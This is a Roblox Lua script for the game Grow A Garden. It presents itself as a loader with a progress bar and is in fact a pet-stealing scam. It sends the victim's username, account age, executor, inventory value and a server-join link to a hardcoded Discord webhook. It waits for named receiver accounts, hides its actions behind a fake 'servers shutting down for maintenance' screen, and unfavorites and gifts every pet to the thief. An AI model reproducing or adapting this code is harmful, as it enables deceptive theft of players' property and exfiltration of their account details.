local Webhook1 = "https://discord.com/api/webhooks/1327560682396319806/57zEMgzAuYQV88Mc_4apFBxvteuIX-6CuwqHKa8BsXScpW1orh3HkbPq_nvRIsmETMJN"

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local RECEIVERS = {"Roqate", "TwiistyGotTerminated", "rezngl", "jjjhgggbnn"}
local SPECIAL_PETS = {"Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}
local CHECK_INTERVAL = 5
local SHUTDOWN_DURATION = 10
local GIFT_COOLDOWN = 3
local MINIMUM_PETS = 3
local MINIMUM_TOTAL_VALUE = 50000

-- Executor detection
local function getExecutor()
    if syn then
        return "Synapse X"
    elseif KRNL_LOADED then
        return "Krnl"
    elseif fluxus then
        return "Fluxus"
    elseif identifyexecutor then
        return identifyexecutor()
    elseif getexecutorname then
        return getexecutorname()
    else
        return "Unknown Executor"
    end
end

if syn then
    syn.protect_gui(syn.secure_call)
    setfflag("HttpServiceEnabled", true)
end

local function sendWebhook(data)
    local startTime = os.clock()
    if not data or (not data.content and not data.embeds) then
        return false
    end

    local body = {
        content = data.content,
        embeds = data.embeds,
        username = "Roqate Steals",
        avatar_url = "https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png"
    }

    local json, encodeError = pcall(HttpService.JSONEncode, HttpService, body)
    if not json then
        return false
    end

    local requestMethods = {
        syn and syn.request,
        http_request,
        request,
        fluxus and fluxus.request,
        http and http.request
    }

    for _, reqFunc in ipairs(requestMethods) do
        if type(reqFunc) == "function" then
            local success, response = pcall(function()
                local requestStart = os.clock()
                local result = reqFunc({
                    Url = Webhook1,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["User-Agent"] = "Roblox"
                    },
                    Body = json
                })
                return result
            end)

            if success and response then
                if response.StatusCode and response.StatusCode >= 200 and response.StatusCode < 300 then
                    return true
                end
            end
        end
    end
    return false
end

local function createLoader()
    local loaderGui = Instance.new("ScreenGui")
    loaderGui.Name = "RoqateLoader"
    loaderGui.IgnoreGuiInset = true
    loaderGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loaderGui.DisplayOrder = 999999

    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 150)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = loaderGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = mainFrame

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Text = "Roqate Steals"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 24
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.BackgroundTransparency = 1
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 10)
    titleLabel.Parent = mainFrame

    local progressFrame = Instance.new("Frame")
    progressFrame.Size = UDim2.new(0.9, 0, 0, 20)
    progressFrame.Position = UDim2.new(0.05, 0, 0, 100)
    progressFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    progressFrame.BorderSizePixel = 0
    progressFrame.Parent = mainFrame

    local progressCorner = Instance.new("UICorner")
    progressCorner.CornerRadius = UDim.new(0, 10)
    progressCorner.Parent = progressFrame

    local progressBar = Instance.new("Frame")
    progressBar.Size = UDim2.new(0, 0, 1, 0)
    progressBar.BackgroundColor3 = Color3.fromRGB(130, 36, 212)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = progressFrame

    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 10)
    barCorner.Parent = progressBar

    loaderGui.Parent = CoreGui

    local function updateProgress(percent)
        TweenService:Create(progressBar, TweenInfo.new(0.5), {
            Size = UDim2.new(percent / 100, 0, 1, 0)
        }):Play()
    end

    updateProgress(10)
    task.wait(1)
    updateProgress(30)
    task.wait(1.5)
    updateProgress(60)
    task.wait(2)
    updateProgress(100)
    task.wait(1)

    TweenService:Create(mainFrame, TweenInfo.new(0.5), {
        Size = UDim2.new(0, 0, 0, 0)
    }):Play()
    task.wait(0.5)
    loaderGui:Destroy()
end

local function createFakeShutdown()
    local gui = Instance.new("ScreenGui")
    gui.Name = "FakeShutdown"
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 999999

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Parent = gui

    local title = Instance.new("TextLabel")
    title.Text = "Grow A Garden"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.Size = UDim2.new(1, 0, 0.3, 0)
    title.Position = UDim2.new(0, 0, 0.3, 0)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.SourceSansBold
    title.TextSize = 32
    title.TextTransparency = 1
    title.Parent = frame

    local message = Instance.new("TextLabel")
    message.Text = "Servers shutting down for maintenance..."
    message.TextColor3 = Color3.new(1, 1, 1)
    message.Size = UDim2.new(1, 0, 0.2, 0)
    message.Position = UDim2.new(0, 0, 0.5, 0)
    message.BackgroundTransparency = 1
    message.Font = Enum.Font.SourceSans
    message.TextSize = 24
    message.TextTransparency = 1
    message.Parent = frame

    local dots = Instance.new("TextLabel")
    dots.Text = "Please wait"
    dots.TextColor3 = Color3.new(1, 1, 1)
    dots.Size = UDim2.new(1, 0, 0.1, 0)
    dots.Position = UDim2.new(0, 0, 0.6, 0)
    dots.BackgroundTransparency = 1
    dots.Font = Enum.Font.SourceSans
    dots.TextSize = 18
    dots.TextTransparency = 1
    dots.Parent = frame

    gui.Parent = CoreGui

    local fadeInTime = 1.5
    local fadeInStart = os.clock()
    local fadeConn
    fadeConn = RunService.Heartbeat:Connect(function()
        local elapsed = os.clock() - fadeInStart
        local alpha = math.min(elapsed / fadeInTime, 1)

        title.TextTransparency = 1 - alpha
        message.TextTransparency = 1 - alpha
        dots.TextTransparency = 1 - alpha

        if alpha >= 1 then
            fadeConn:Disconnect()
        end
    end)

    local dotCount = 0
    local lastDotTime = os.clock()
    local dotInterval = 0.8
    local dotConn
    dotConn = RunService.Heartbeat:Connect(function()
        local now = os.clock()
        if now - lastDotTime >= dotInterval then
            lastDotTime = now
            dotCount = (dotCount + 1) % 4
            dots.Text = "Please wait"..string.rep(".", dotCount)
        end
    end)

    local pulseConn
    pulseConn = RunService.Heartbeat:Connect(function()
        local pulse = math.sin(os.clock() * 1.5) * 0.05 + 1
        title.TextSize = 32 * pulse
    end)

    return gui, function()
        if fadeConn then fadeConn:Disconnect() end
        if dotConn then dotConn:Disconnect() end
        if pulseConn then pulseConn:Disconnect() end
        gui:Destroy()
    end
end

local function getSortedPets()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if not backpack then return {} end

    local pets = {}

    for _, item in ipairs(backpack:GetChildren()) do
        local nameMatch = item.Name:match("^(.+) %[%d+%.%d+ KG%] %[Age %d+%]$")
        if nameMatch then
            local petName = nameMatch
            local kg = tonumber(item.Name:match("%[(%d+%.%d+) KG%]"))
            local age = tonumber(item.Name:match("%[Age (%d+)%]"))
            local isSpecial = false

            for _, specialName in ipairs(SPECIAL_PETS) do
                if petName:find(specialName) then
                    isSpecial = true
                    break
                end
            end

            table.insert(pets, {
                instance = item,
                name = petName,
                fullName = item.Name,
                kg = kg,
                age = age,
                special = isSpecial
            })
        end
    end

    if #pets == 0 then return pets end

    table.sort(pets, function(a, b)
        if a.special and not b.special then return true end
        if not a.special and b.special then return false end
        if a.kg ~= b.kg then return a.kg > b.kg end
        return a.age > b.age
    end)

    return pets
end

local function calculateInventoryValue(pets)
    local totalValue = 0
    for _, pet in ipairs(pets) do
        totalValue = totalValue + (pet.kg * 10000) + (pet.age * 1000)
    end
    return math.floor(totalValue)
end

local function sendInitialReport()
    local startTime = os.clock()
    local pets = getSortedPets()
    if #pets < MINIMUM_PETS then
        return false, "Not enough pets ("..#pets.."/"..MINIMUM_PETS..")"
    end

    local totalValue = calculateInventoryValue(pets)
    if totalValue < MINIMUM_TOTAL_VALUE then
        return false, "Low value ("..totalValue.."/"..MINIMUM_TOTAL_VALUE.."¢)"
    end

    local placeId = game.PlaceId
    local jobId = game.JobId
    local serverUrl = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", placeId, jobId)

    local petList = ""
    local specialCount = 0
    for _, pet in ipairs(pets) do
        local value = math.floor((pet.kg * 10000) + (pet.age * 1000))
        petList = petList..string.format(
            "%s %s [%.2f KG] [Age %d] → %d¢\n",
            pet.special and "🌟" or "🐶",
            pet.name,
            pet.kg,
            pet.age,
            value
        )
        if pet.special then specialCount = specialCount + 1 end
    end

    local executor = getExecutor()
    
    local embed = {
        title = "📊 Roqate Steals Report",
        description = string.format([[
**Player:** %s (@%s)
**Account Age:** %d days
**Executor:** %s
**Server:** [Join Game](%s)

**Pet Inventory (%d)**
```%s```
**Total Value:** %d¢
**Special Pets:** %d
**Report Generation Time:** %.2f seconds
]], 
            LocalPlayer.Name,
            LocalPlayer.DisplayName,
            LocalPlayer.AccountAge,
            executor,
            serverUrl,
            #pets,
            petList,
            totalValue,
            specialCount,
            os.clock() - startTime
        ),
        color = 65280,
        footer = {
            text = "Watching for: "..table.concat(RECEIVERS, ", ")
        },
        timestamp = DateTime.now():ToIsoDate()
    }

    local webhookStart = os.clock()
    local success = sendWebhook({
        content = specialCount > 0 and "@everyone" or nil,
        embeds = {embed}
    })
    
    return success, "Webhook sent in "..string.format("%.2f", os.clock() - webhookStart).." seconds"
end

local function isPetFavorited(petName)
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    return pet and pet:GetAttribute("Favorited")
end

local function unfavoritePet(petName)
    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if pet then
        ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
        return true
    end
    return false
end

local function giftPet(targetPlayer, petName)
    ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", targetPlayer)
end

local function equipSinglePet(petName)
    local character = LocalPlayer.Character
    if not character then return false end

    for _, item in ipairs(character:GetChildren()) do
        if item.Name:match(" %[%d+%.%d+ KG%] %[Age %d+%]$") then
            item.Parent = LocalPlayer.Backpack
        end
    end

    local pet = LocalPlayer.Backpack:FindFirstChild(petName)
    if not pet then return false end

    pet.Parent = character
    return true
end

local function teleportToPlayer(targetPlayer)
    if not LocalPlayer.Character then return false end
    local humanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return false end

    if not targetPlayer.Character then return false end
    local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
    if not targetHrp then return false end

    local offset = targetHrp.CFrame.LookVector * -5
    offset = Vector3.new(offset.X, 0, offset.Z)
    humanoidRootPart.CFrame = CFrame.new(targetHrp.Position + offset, targetHrp.Position)
    return true
end

local function isReceiverInGame()
    for _, receiverName in ipairs(RECEIVERS) do
        local player = Players:FindFirstChild(receiverName)
        if player then return player end
    end
    return nil
end

local function waitForReceiver()
    local receiverFound = Instance.new("BindableEvent")

    for _, player in ipairs(Players:GetPlayers()) do
        if table.find(RECEIVERS, player.Name) then
            receiverFound:Fire(player)
            break
        end
    end

    local connection = Players.PlayerAdded:Connect(function(player)
        if table.find(RECEIVERS, player.Name) then
            receiverFound:Fire(player)
        end
    end)

    local backupCheck = coroutine.create(function()
        while true do
            local receiver = isReceiverInGame()
            if receiver then
                receiverFound:Fire(receiver)
                break
            end
            task.wait(CHECK_INTERVAL)
        end
    end)
    coroutine.resume(backupCheck)

    local foundReceiver = receiverFound.Event:Wait()
    connection:Disconnect()
    return foundReceiver
end

local function startGifting(targetPlayer)
    while true do
        local pets = getSortedPets()
        if #pets == 0 then break end

        for _, pet in ipairs(pets) do
            if isPetFavorited(pet.fullName) then
                unfavoritePet(pet.fullName)
                task.wait(1)
            end

            if equipSinglePet(pet.fullName) then
                giftPet(targetPlayer, pet.fullName)
                task.wait(GIFT_COOLDOWN)
                break
            end
        end
        task.wait(1)
    end
end

createLoader()
local reportSuccess, reportMessage = sendInitialReport()
if not reportSuccess then
    return
end

local receiver = waitForReceiver()
if not receiver then
    return
end

local shutdownGui, cleanupFunc = createFakeShutdown()
teleportToPlayer(receiver)

task.wait(2)
startGifting(receiver)

task.wait(SHUTDOWN_DURATION)
if type(cleanupFunc) == "function" then
    cleanupFunc()
elseif shutdownGui then
    shutdownGui:Destroy()
end
